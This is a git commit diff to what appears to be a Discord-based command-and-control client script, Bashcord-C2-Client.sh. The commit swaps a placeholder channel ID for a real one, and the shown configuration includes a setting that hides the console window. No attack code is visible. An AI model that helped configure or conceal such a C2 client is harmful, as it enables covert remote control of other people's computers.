403fa5b6617ec99396a29264e22a78b7c9adc11b
Nohay <145207018+Nohay-fr@users.noreply.github.com>
2025-02-22 15:42:37 +0100

    Update Bashcord-C2-Client.sh

--- Bashcord-C2-Client.sh
+++ Bashcord-C2-Client.sh
@@ -17,7 +17,7 @@
 # 8. Change BOT_USER_ID_HERE below to your bots user ID.
 
 token="YOUR_BOT_TOKEN_HERE" # Your bot intents should be on and 'read messages' permissions when joining your server
-chan="CHANNEL_ID_HERE" # On Discord app rightclick the channel > 'Copy Channel ID' (Make sure the bot can access this channel)
+chan="1340694295413526589" # On Discord app rightclick the channel > 'Copy Channel ID' (Make sure the bot can access this channel)
 bot_id="BOT_USER_ID_HERE" # Settings > Advanced > Developer mode ON -- then On Discord app rightclick the bot > 'Copy User ID' 
 HideWindow=1 # 1 = hide console window
 
